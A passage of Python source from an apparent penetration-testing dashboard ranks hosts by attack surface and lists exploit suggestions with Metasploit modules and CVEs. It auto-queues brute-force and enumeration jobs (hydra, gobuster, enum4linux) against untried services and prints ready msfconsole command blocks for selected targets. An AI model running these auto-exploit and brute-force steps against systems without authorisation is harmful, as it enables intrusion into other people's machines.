    # Disable SearchSploit in dashboard to prevent UI hangs - use manual Exploit Suggestions menu instead
    engine = ExploitSuggestionEngine(use_searchsploit=False)

    click.echo("═" * width)
    click.echo(click.style("💣 EXPLOIT SUGGESTIONS", bold=True, fg="red"))
    click.echo("─" * width)
    click.echo()

    # Get suggestions for top 1 or all hosts
    display_count = len(top_hosts) if show_all else 1
    hosts_with_exploits = 0

    for host_data in top_hosts[:display_count]:
        host_ip = host_data.get("host") or host_data.get("ip_address")
        if not host_ip:
            continue

        # Get host_id from IP
        from souleyez.storage.hosts import HostManager

        hm = HostManager()
        host_obj = hm.get_host_by_ip(engagement_id, host_ip)
        if not host_obj:
            continue

        host_id = host_obj["id"]
        suggestions = engine.generate_suggestions(engagement_id, host_id)

        if not suggestions["hosts"]:
            continue

        host_suggestions = suggestions["hosts"][0]
        ip = host_suggestions["ip"]
        hostname = host_suggestions.get("hostname", "")

        # Count services with exploits
        services_with_exploits = [
            s for s in host_suggestions["services"] if s.get("exploits")
        ]
        if not services_with_exploits:
            continue

        hosts_with_exploits += 1

        # Host header
        display_name = f"{ip}" + (f" ({hostname})" if hostname else "")
        console.print(f"[cyan]┌─ {display_name}[/cyan]")

        # Collect all exploits from all services with their service info
        all_exploits = []
        for svc in services_with_exploits:
            for exploit in svc.get("exploits", []):
                all_exploits.append(
                    {
                        "exploit": exploit,
                        "port": svc["port"],
                        "service": svc["service"],
                        "version": svc.get("version", "unknown"),
                    }
                )

        # Sort by severity (critical > high > medium > low > info)
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        all_exploits.sort(
            key=lambda x: severity_order.get(x["exploit"].get("severity", "info"), 5)
        )

        # Show top 2 exploits when collapsed, all when expanded
        display_exploit_count = (
            len(all_exploits) if show_all else min(2, len(all_exploits))
        )
        has_more_exploits = len(all_exploits) > 2

        for idx, item in enumerate(all_exploits[:display_exploit_count]):
            exploit = item["exploit"]
            port = item["port"]
            service = item["service"]
            version = item["version"]

            severity = exploit.get("severity", "info")
            severity_colors = {
                "critical": "red",
                "high": "yellow",
                "medium": "blue",
                "low": "white",
                "info": "dim",
            }
            color = severity_colors.get(severity, "white")

            # Service info
            console.print(f"  ├─ Port {port}/{service} [dim]({version})[/dim]")

            # Title and severity
            title = exploit["title"][:60]
            severity_display = severity.upper()
            console.print(
                f"     ├─ [{color}]{title}[/{color}] [{color}][{severity_display}][/{color}]"
            )

            # MSF module
            msf_module = exploit.get("msf_module", "N/A")
            console.print(f"     │  MSF: [cyan]{msf_module}[/cyan]")

            # CVE if available
            if exploit.get("cve"):
                console.print(f"     │  CVE: [yellow]{exploit['cve']}[/yellow]")

            # Description (truncated)
            desc = exploit.get("description", "")[:80]
            console.print(f"     │  [dim]{desc}[/dim]")
            console.print()

        click.echo()

    # Count total hosts with exploits (do this BEFORE showing "no exploits" message)
    total_with_exploits = 0
    for host_data in top_hosts:
        host_ip = host_data.get("host") or host_data.get("ip_address")
        if not host_ip:
            continue
        from souleyez.storage.hosts import HostManager

        hm = HostManager()
        host_obj = hm.get_host_by_ip(engagement_id, host_ip)
        if not host_obj:
            continue
        suggestions = engine.generate_suggestions(engagement_id, host_obj["id"])
        if suggestions["hosts"] and suggestions["hosts"][0]["services"]:
            services_with_exploits = [
                s for s in suggestions["hosts"][0]["services"] if s.get("exploits")
            ]
            if services_with_exploits:
                total_with_exploits += 1

    # Show message based on whether ANY hosts have exploits (not just displayed ones)
    if total_with_exploits == 0:
        click.echo(click.style("  No exploit suggestions available yet", fg="yellow"))
        click.echo()
        click.echo(click.style("  💡 Possible reasons:", fg="cyan"))
        click.echo("     • Service versions not detected - Run: nmap -sV <target>")
        click.echo("     • Services are up-to-date with no known exploits")
        click.echo("     • SearchSploit database needs updating")
        click.echo()

        # Show diagnostic info
        total_services = sum(len(h.get("services", [])) for h in top_hosts)
        services_with_version = sum(
            1
            for h in top_hosts
            for s in h.get("services", [])
            if s.get("version") and s.get("version") != "Unknown"
        )

        click.echo(click.style("  Diagnostics:", fg="cyan"))
        click.echo(f"     • Total services scanned: {total_services}")
        click.echo(f"     • Services with version info: {services_with_version}")
        if services_with_version < total_services:
            click.echo(
                f"     • Missing version info: {total_services - services_with_version}"
            )
        click.echo()
    elif hosts_with_exploits == 0 and total_with_exploits > 0:
        # Exploits exist but not in the displayed hosts
        click.echo(
            click.style(
                f"  💡 {total_with_exploits} host(s) with exploits available - use option [7] to show all",
                fg="cyan",
            )
        )

    has_more = total_with_exploits > 1 and not show_all and hosts_with_exploits > 0
    if has_more and not show_all:
        remaining_hosts = total_with_exploits - display_count
        # Also count total remaining exploits
        total_exploits = 0
        for host_data in top_hosts:
            host_ip = host_data.get("host") or host_data.get("ip_address")
            if not host_ip:
                continue
            from souleyez.storage.hosts import HostManager

            hm = HostManager()
            host_obj = hm.get_host_by_ip(engagement_id, host_ip)
            if not host_obj:
                continue
            suggestions = engine.generate_suggestions(engagement_id, host_obj["id"])
            if suggestions["hosts"] and suggestions["hosts"][0]["services"]:
                for svc in suggestions["hosts"][0]["services"]:
                    total_exploits += len(svc.get("exploits", []))

        # Calculate shown exploits (top 2 from top host)
        shown_exploits = display_exploit_count if hosts_with_exploits > 0 else 0
        remaining_exploits = max(0, total_exploits - shown_exploits)

        click.echo(
            click.style(
                f"  ... and {remaining_exploits} more exploits from {remaining_hosts} more hosts (option [7] to show all)",
                fg="bright_black",
            )
        )

    click.echo()
    return has_more


def display_recommendations(
    recommendations: List[Dict], width: int, show_all: bool = False
):
    """Display recommended next steps."""
    if not recommendations:
        return False

    click.echo("═" * width)
    click.echo(click.style("💡 RECOMMENDED NEXT STEPS", bold=True, fg="cyan"))
    click.echo("─" * width)
    click.echo()

    priority_emoji = {"high": "🎯", "medium": "🔍", "low": "📝"}

    # Show top 3 or all
    display_count = len(recommendations) if show_all else min(3, len(recommendations))
    has_more = len(recommendations) > 3

    for idx, rec in enumerate(recommendations[:display_count], 1):
        emoji = priority_emoji.get(rec["priority"], "•")
        click.echo(
            f"{idx}. {emoji} {rec['action']} - {rec['service']} on {rec['host']}:{rec['port']}"
        )
        click.echo(f"   {rec['reason']}")
        click.echo(f"   {click.style('[Enqueue Action]', fg='green')}")
        click.echo()

    # Show "show more" indicator
    if has_more and not show_all:
        remaining = len(recommendations) - display_count
        click.echo(
            click.style(
                f"  ... and {remaining} more recommendations (option [8] to show all)",
                fg="bright_black",
            )
        )
        click.echo()

    return has_more


def display_menu(width: int):
    """Display menu options."""
    click.echo("═" * width)
    click.echo(click.style("OPTIONS", bold=True, fg="yellow"))
    click.echo("─" * width)
    click.echo()
    click.echo("  [d] View Host Details - Select and view specific host")
    click.echo("  [s] Filter Services - Filter by status, port, etc.")
    click.echo("  [x] Export Report - Generate attack surface report")
    click.echo("  [a] Auto-Exploit - Automatically exploit untried services")
    click.echo("  [r] Refresh Data - Reload attack surface analysis")
    click.echo()
    click.echo("  [t] Show All Targets - Display all discovered hosts")
    click.echo("  [e] Show All Exploits - Display all exploit suggestions")
    click.echo("  [m] Show All Recommendations - Display all next steps")
    click.echo()
    click.echo("═" * width)
    click.echo()
    click.echo("  [q] ← Back to Main Menu")


def filter_services(engagement_id: int, analysis: Dict):
    """Filter services by criteria."""
    from souleyez.ui.design_system import DesignSystem

    DesignSystem.clear_screen()
    click.echo()
    click.echo(click.style("🔍 FILTER SERVICES", bold=True, fg="cyan"))
    click.echo("=" * 80)
    click.echo()

    # Prompt for filter criteria
    click.echo("Filter by:")
    service_filter = click.prompt(
        "  Service name (or press Enter to skip)", default="", show_default=False
    )
    port_filter = click.prompt(
        "  Port number (or press Enter to skip)", default="", show_default=False
    )
    protocol_filter = click.prompt(
        "  Protocol (tcp/udp, or press Enter to skip)", default="", show_default=False
    )

    # Apply filters
    filtered_hosts = []
    for host in analysis["hosts"]:
        filtered_services = []
        for svc in host.get("services", []):
            # Apply filters
            if (
                service_filter
                and service_filter.lower() not in (svc.get("service") or "").lower()
            ):
                continue
            if port_filter and str(svc.get("port", "")) != port_filter:
                continue
            if (
                protocol_filter
                and svc.get("protocol", "").lower() != protocol_filter.lower()
            ):
                continue
            filtered_services.append(svc)

        if filtered_services:
            host_copy = host.copy()
            host_copy["services"] = filtered_services
            filtered_hosts.append(host_copy)

    # Display results
    click.echo()
    click.echo(
        click.style(
            f"📊 Found {len(filtered_hosts)} host(s) with matching services",
            fg="green",
            bold=True,
        )
    )
    click.echo()

    if not filtered_hosts:
        click.echo(click.style("  No services match your filters", fg="yellow"))
    else:
        for host in filtered_hosts:
            click.echo(f"  {host['host']} - {len(host['services'])} service(s)")
            for svc in host["services"][:5]:  # Show first 5
                service_name = (svc.get("service") or "unknown")[:30]
                click.echo(
                    f"    • {svc['port']}/{svc.get('protocol', 'tcp')} - {service_name}"
                )
            if len(host["services"]) > 5:
                click.echo(f"    ... and {len(host['services']) - 5} more")

    click.echo()
    click.pause()


def view_host_details(engagement_id: int, hosts: List[Dict]):
    """View detailed information for a specific host."""
    from souleyez.ui.design_system import DesignSystem

    if not hosts:
        click.echo(click.style("\nNo hosts available", fg="yellow"))
        click.pause()
        return

    click.echo("\n" + click.style("Select host:", bold=True))
    for idx, host in enumerate(hosts, 1):
        click.echo(f"  [{idx}] {host['host']} (Score: {host['score']})")
    click.echo("  [q] Cancel")

    try:
        choice_input = input("\n  Select option: ").strip().lower()
        if choice_input == "q":
            return
        choice = int(choice_input) if choice_input.isdigit() else 0
        if choice > 0 and choice <= len(hosts):
            host = hosts[choice - 1]
            # Display full service table
            DesignSystem.clear_screen()
            width = get_terminal_width()

            click.echo("\n" + "=" * width)
            click.echo(
                click.style(f"Host: {host['host']}", bold=True, fg="cyan").center(width)
            )
            if host.get("hostname"):
                click.echo(
                    click.style(f"({host['hostname']})", fg="bright_black").center(
                        width
                    )
                )
            click.echo("=" * width + "\n")

            click.echo(
                f"Attack Surface Score: {click.style(str(host['score']), bold=True)}"
            )
            click.echo(f"Open Ports: {host['open_ports']}")
            click.echo(f"Services: {len(host.get('services', []))}")
            click.echo(
                f"Findings: {host['findings']} ({host['critical_findings']} critical)"
            )
            click.echo()

            # Show all services in a table
            from rich.console import Console
            from rich.table import Table

            from souleyez.ui.design_system import DesignSystem

            console = Console(width=width - 4)
            table = Table(
                show_header=True,
                header_style="bold cyan",
                box=DesignSystem.TABLE_BOX,
                padding=(0, 1),
                expand=True,
            )

            table.add_column("Port", width=8)
            table.add_column("Service", width=20)
            table.add_column("Version", width=30)
            table.add_column("Status", width=15)
            table.add_column("Creds", width=8, justify="center")
            table.add_column("Findings", width=10, justify="center")

            for svc in host.get("services", []):
                status_emoji = {"exploited": "✅", "attempted": "🔄", "not_tried": "⚠️"}
                emoji = status_emoji.get(svc["status"], "•")
                status_text = f"{emoji} {svc['status'].replace('_', ' ').upper()}"

                version = svc.get("version") or "-"

                table.add_row(
                    str(svc["port"]),
                    svc.get("service") or "unknown",
                    version,
                    status_text,
                    str(svc.get("credentials", 0)),
                    str(svc.get("findings", 0)),
                )

            console.print(table)

            click.pause("\nPress any key to return...")
    except (ValueError, KeyboardInterrupt, EOFError):
        pass


def auto_exploit_untried(engagement_id: int, hosts: List[Dict]):
    """Auto-enqueue exploits for untried services."""
    click.echo(
        click.style(
            "\n⚠️  WARNING: This will enqueue multiple exploit jobs",
            fg="yellow",
            bold=True,
        )
    )

    # Count untried services
    untried_count = sum(h["exploitation_progress"]["not_tried"] for h in hosts)

    if untried_count == 0:
        click.echo(click.style("\nNo untried services found!", fg="green"))
        click.echo()

        # Show diagnostic info
        total_services = sum(len(h.get("services", [])) for h in hosts)
        exploited = sum(h["exploitation_progress"]["exploited"] for h in hosts)
        attempted = sum(h["exploitation_progress"]["attempted"] for h in hosts)

        click.echo("Service Status Summary:")
        click.echo(f"  Total services:     {total_services}")
        click.echo(f"  ✅ Exploited:       {exploited}")
        click.echo(f"  🔄 Attempted:       {attempted}")
        click.echo(f"  ⚠️  Not tried:       {untried_count}")
        click.echo()
        click.echo("All services have already been tested!")

        click.pause()
        return

    click.echo(f"Found {untried_count} untried services")

    try:
        if not click.confirm("\nContinue?", default=False):
            return
    except (KeyboardInterrupt, EOFError):
        return

    from souleyez.engine.background import enqueue_job

    queued = 0
    for host in hosts:
        for service in host.get("services", []):
            if service["status"] == "not_tried":
                # Suggest tool for service
                tool = suggest_tool_for_service(service.get("service") or "unknown")
                if tool:
                    try:
                        enqueue_job(
                            tool=tool,
                            target=host["host"],
                            args=["-p", str(service["port"])],
                            label=f"Auto-exploit: {service.get('service') or 'unknown'}",
                            engagement_id=engagement_id,
                        )
                        queued += 1
                    except:
                        pass  # Skip if enqueue fails

    click.echo(click.style(f"\n✓ Queued {queued} jobs", fg="green"))
    click.pause()


def suggest_tool_for_service(service: str) -> str:
    """Suggest appropriate tool for a service."""
    service_lower = service.lower()
    mapping = {
        "http": "gobuster",
        "https": "gobuster",
        "ssh": "hydra",
        "ftp": "hydra",
        "telnet": "hydra",
        "mysql": "hydra",
        "postgresql": "hydra",
        "smb": "enum4linux",
        "netbios-ssn": "enum4linux",
        "microsoft-ds": "enum4linux",
    }

    for key, tool in mapping.items():
        if key in service_lower:
            return tool

    return None


def export_attack_surface_report(engagement_id: int, engagement: Dict, analysis: Dict):
    """Export attack surface analysis to text report."""
    import os
    from datetime import datetime

    # Create output directory
    output_dir = os.path.expanduser("~/.souleyez/exports")
    os.makedirs(output_dir, exist_ok=True)

    # Generate filename
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = engagement["name"].replace(" ", "_").replace("/", "_")
    filename = f"{safe_name}_attack_surface_{timestamp}.txt"
    filepath = os.path.join(output_dir, filename)

    # Generate report
    lines = []
    lines.append("=" * 70)
    lines.append(f"ATTACK SURFACE REPORT: {engagement['name']}")
    lines.append("=" * 70)
    lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("")

    # Overview
    overview = analysis["overview"]
    lines.append("OVERVIEW")
    lines.append("-" * 70)
    lines.append(f"Total Hosts:        {overview['total_hosts']}")
    lines.append(f"Total Services:     {overview['total_services']}")
    lines.append(
        f"Exploited:          {overview['exploited_services']} / {overview['total_services']} ({overview['exploitation_percentage']}%)"
    )
    lines.append(f"Credentials Found:  {overview['credentials_found']}")
    lines.append(f"Critical Findings:  {overview['critical_findings']}")
    lines.append("")

    # Top targets
    lines.append("TOP TARGETS (by attack surface)")
    lines.append("-" * 70)
    for idx, host in enumerate(analysis["hosts"][:5], 1):
        lines.append(f"\n#{idx} {host['host']} (Score: {host['score']})")
        lines.append(
            f"   Ports: {host['open_ports']} | Services: {host['services']} | Findings: {host['findings']}"
        )
        prog = host["exploitation_progress"]
        pct = round(
            (prog["exploited"] / prog["total"] * 100) if prog["total"] > 0 else 0, 1
        )
        lines.append(f"   Exploitation: {prog['exploited']}/{prog['total']} ({pct}%)")

    lines.append("")

    # Recommendations
    if analysis["recommendations"]:
        lines.append("RECOMMENDED NEXT STEPS")
        lines.append("-" * 70)
        for idx, rec in enumerate(analysis["recommendations"], 1):
            lines.append(
                f"\n{idx}. {rec['action']} - {rec['service']} on {rec['host']}:{rec['port']}"
            )
            lines.append(f"   Priority: {rec['priority'].upper()}")
            lines.append(f"   Reason: {rec['reason']}")

    # Write file
    with open(filepath, "w") as f:
        f.write("\n".join(lines))

    click.echo(click.style(f"\n✓ Report exported to:", fg="green"))
    click.echo(f"  {filepath}")
    click.pause()


def _view_quick_wins(engagement_id: int, analysis: Dict):
    """Display Quick Wins - easy exploits across all hosts.

    Shows services with high-severity CVEs or known MSF modules that are
    untried and have high success probability.
    """
    from rich.console import Console

    from souleyez.intelligence.exploit_suggestions import ExploitSuggestionEngine
    from souleyez.storage.hosts import HostManager
    from souleyez.ui.design_system import DesignSystem

    console = Console()
    engine = ExploitSuggestionEngine(use_searchsploit=False)  # Fast mode
    hm = HostManager()

    width = get_terminal_width()

    # Collect all quick wins across hosts
    quick_wins = []

    for host_data in analysis["hosts"]:
        host_ip = host_data.get("host", "")
        if not host_ip:
            continue

        host_obj = hm.get_host_by_ip(engagement_id, host_ip)
        if not host_obj:
            continue

        host_id = host_obj["id"]
        hostname = host_data.get("hostname", "")

        try:
            suggestions = engine.generate_suggestions(engagement_id, host_id)

            if not suggestions["hosts"]:
                continue

            host_suggestions = suggestions["hosts"][0]

            for svc in host_suggestions.get("services", []):
                # Only consider untried services
                if svc.get("status") == "exploited":
                    continue

                for exploit in svc.get("exploits", []):
                    severity = exploit.get("severity", "info")

                    # Quick wins: critical/high severity with MSF module
                    if severity in ["critical", "high"] and exploit.get("msf_module"):
                        quick_wins.append(
                            {
                                "host": host_ip,
                                "host_id": host_id,
                                "hostname": hostname,
                                "port": svc["port"],
                                "service": svc["service"],
                                "version": svc.get("version", ""),
                                "severity": severity,
                                "title": exploit["title"],
                                "msf_module": exploit.get("msf_module", "N/A"),
                                "cve": exploit.get("cve", ""),
                            }
                        )
        except Exception:
            continue  # Skip hosts that fail

    # Sort by severity (critical first)
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    quick_wins.sort(key=lambda x: severity_order.get(x["severity"], 5))

    if not quick_wins:
        DesignSystem.clear_screen()
        click.echo("\n┌" + "─" * (width - 2) + "┐")
        click.echo(
            "│"
            + click.style(
                " QUICK WINS - EASY EXPLOITS ".center(width - 2), bold=True, fg="green"
            )
            + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()
        console.print("[yellow]No quick wins found.[/yellow]")
        console.print()
        console.print("[dim]Possible reasons:[/dim]")
        console.print("  • All high-value services have been exploited")
        console.print("  • Services don't have version information")
        console.print("  • No known MSF modules match detected services")
        console.print()
        click.pause()
        return

    # Interactive loop
    page_size = 20
    current_page = 0
    selected_ids = set()  # Track selected items by index

    while True:
        DesignSystem.clear_screen()
        width = get_terminal_width()

        click.echo("\n┌" + "─" * (width - 2) + "┐")
        click.echo(
            "│"
            + click.style(
                " QUICK WINS - EASY EXPLOITS ".center(width - 2), bold=True, fg="green"
            )
            + "│"
        )
        click.echo("└" + "─" * (width - 2) + "┘")
        click.echo()

        # Summary
        critical_count = sum(1 for q in quick_wins if q["severity"] == "critical")
        high_count = sum(1 for q in quick_wins if q["severity"] == "high")
        total_pages = max(1, (len(quick_wins) + page_size - 1) // page_size)
        current_page = min(current_page, total_pages - 1)

        selected_text = f"  |  Selected: {len(selected_ids)}" if selected_ids else ""
        console.print(f"📊 SUMMARY")
        console.print(
            f"  Found {len(quick_wins)} quick win(s): "
            f"[red]{critical_count} critical[/red] | [yellow]{high_count} high[/yellow]{selected_text}"
        )
        console.print()

        # Page info
        page_info = f"Page {current_page + 1}/{total_pages}" if total_pages > 1 else ""
        click.echo(
            click.style(f"📋 EXPLOITS ", bold=True, fg="cyan")
            + click.style(page_info, fg="bright_black")
        )
        click.echo("─" * width)

        # Table header with checkbox
        click.echo(
            click.style(
                f"  ○ │   # │ {'Host':<30} │ {'Port':<6} │ {'Service':<12} │ {'Sev':<10} │ {'CVE':<18} │ MSF Module",
                bold=True,
            )
        )
        click.echo("─" * width)

        # Calculate slice for current page
        start_idx = current_page * page_size
        end_idx = min(start_idx + page_size, len(quick_wins))

        # Display quick wins for current page
        for idx in range(start_idx, end_idx):
            qw = quick_wins[idx]
            item_num = idx + 1

            # Checkbox
            checkbox = "●" if idx in selected_ids else "○"

            sev_emoji = "🔴 CRIT" if qw["severity"] == "critical" else "🟠 HIGH"
            host_display = qw["host"]
            if qw["hostname"]:
                host_display = f"{qw['host']} ({qw['hostname'][:12]})"

            click.echo(
                f"  {checkbox} │ {item_num:>3} │ {host_display:<30} │ {qw['port']:<6} │ {qw['service']:<12} │ {sev_emoji:<10} │ {(qw['cve'] or '-'):<18} │ {qw['msf_module'][:40]}"
            )

        click.echo("─" * width)
        click.echo()

        # TIP line
        click.echo("  💡 TIP: Press 'i' for interactive mode")
        if total_pages > 1:
            click.echo("  n/p: Next/Previous page")
        click.echo()

        # Menu
        click.echo("─" * width)
        click.echo()
        click.echo("  [#] Select exploit by number")
        click.echo("  [v] View MSF commands for selected")
        click.echo("  [a] Select all  |  [u] Unselect all")
        click.echo("  [q] Back")
        click.echo()

        try:
            choice = (
                click.prompt("Select option", default="q", show_default=False)
                .strip()
                .lower()
            )

            if choice == "q":
                return
            elif choice == "n" and current_page < total_pages - 1:
                current_page += 1
            elif choice == "p" and current_page > 0:
                current_page -= 1
            elif choice == "a":
                # Select all
                selected_ids = set(range(len(quick_wins)))
            elif choice == "u":
                # Unselect all
                selected_ids.clear()
            elif choice == "v":
                # View MSF commands for selected
                if not selected_ids:
                    click.echo(click.style("\n✗ No items selected", fg="red"))
                    click.pause()
                else:
                    _show_msf_commands_for_quick_wins(
                        [quick_wins[i] for i in sorted(selected_ids)]
                    )
            elif choice == "i":
                # Interactive mode
                from souleyez.ui.interactive_selector import interactive_select

                # Convert to dicts for selector
                win_items = []
                for idx, qw in enumerate(quick_wins):
                    win_items.append(
                        {
                            "idx": idx,
                            "host": qw["host"],
                            "hostname": qw["hostname"],
                            "port": qw["port"],
                            "service": qw["service"],
                            "severity": qw["severity"],
                            "cve": qw["cve"],
                            "msf_module": qw["msf_module"],
                        }
                    )

                columns = [
                    {"name": "#", "width": 4, "key": "idx", "justify": "right"},
                    {"name": "Host", "width": 25, "key": "host"},
                    {"name": "Port", "width": 6, "key": "port"},
                    {"name": "Service", "width": 12, "key": "service"},
                    {"name": "Sev", "width": 8, "key": "severity"},
                    {"name": "CVE", "width": 15, "key": "cve"},
                    {"name": "Module", "width": 35, "key": "msf_module"},
                ]

                def format_win_cell(item: dict, key: str) -> str:
                    value = item.get(key)
                    if key == "idx":
                        return str(value + 1)
                    if key == "severity":
                        return (
                            "[red]CRIT[/red]"
                            if value == "critical"
                            else "[yellow]HIGH[/yellow]"
                        )
                    if key == "host":
                        hostname = item.get("hostname", "")
                        if hostname:
                            return f"{value} ({hostname[:8]})"
                        return str(value)
                    return str(value) if value else "-"

                interactive_select(
                    items=win_items,
                    columns=columns,
                    selected_ids=selected_ids,
                    get_id=lambda w: w.get("idx"),
                    title="SELECT QUICK WINS",
                    format_cell=format_win_cell,
                )

                # After selection, show action menu if items selected
                if selected_ids:
                    _show_msf_commands_for_quick_wins(
                        [quick_wins[i] for i in sorted(selected_ids)]
                    )
            elif choice.isdigit():
                # Toggle selection by number
                idx = int(choice) - 1
                if 0 <= idx < len(quick_wins):
                    if idx in selected_ids:
                        selected_ids.discard(idx)
                        click.echo(
                            click.style(f"  ○ Deselected #{idx + 1}", fg="yellow")
                        )
                    else:
                        selected_ids.add(idx)
                        click.echo(
                            click.style(
                                f"  ● Selected #{idx + 1}: {quick_wins[idx]['msf_module']}",
                                fg="green",
                            )
                        )
                    import time

                    time.sleep(0.3)
                else:
                    click.echo(click.style("\n✗ Invalid number", fg="red"))
                    click.pause()
        except (KeyboardInterrupt, EOFError):
            return


def _show_msf_commands_for_quick_wins(selected_wins: list):
    """Show MSF commands for selected quick wins."""
    from rich.console import Console
    from rich.panel import Panel

    from souleyez.ui.design_system import DesignSystem

    console = Console()
    DesignSystem.clear_screen()
    width = get_terminal_width()

    click.echo("\n┌" + "─" * (width - 2) + "┐")
    click.echo(
        "│"
        + click.style(
            " MSF COMMANDS FOR SELECTED EXPLOITS ".center(width - 2),
            bold=True,
            fg="cyan",
        )
        + "│"
    )
    click.echo("└" + "─" * (width - 2) + "┘")
    click.echo()

    console.print(f"[bold]Selected {len(selected_wins)} exploit(s)[/bold]")
    console.print()

    for idx, qw in enumerate(selected_wins, 1):
        sev_color = "red" if qw["severity"] == "critical" else "yellow"
        console.print(
            f"[bold cyan]#{idx}[/bold cyan] [{sev_color}]{qw['severity'].upper()}[/{sev_color}] {qw['host']}:{qw['port']} ({qw['service']})"
        )

        if qw["cve"]:
            console.print(f"    CVE: {qw['cve']}")

        # Generate MSF command
        msf_module = qw["msf_module"]
        if msf_module and msf_module != "N/A":
            cmd_lines = [
                f"use {msf_module}",
                f"set RHOSTS {qw['host']}",
                f"set RPORT {qw['port']}",
                "run",
            ]
            cmd_block = "\n".join(cmd_lines)
            console.print(
                Panel(
                    cmd_block,
                    title="[green]msfconsole[/green]",
                    border_style="green",
                    expand=False,
                )
            )
        console.print()

    click.pause()
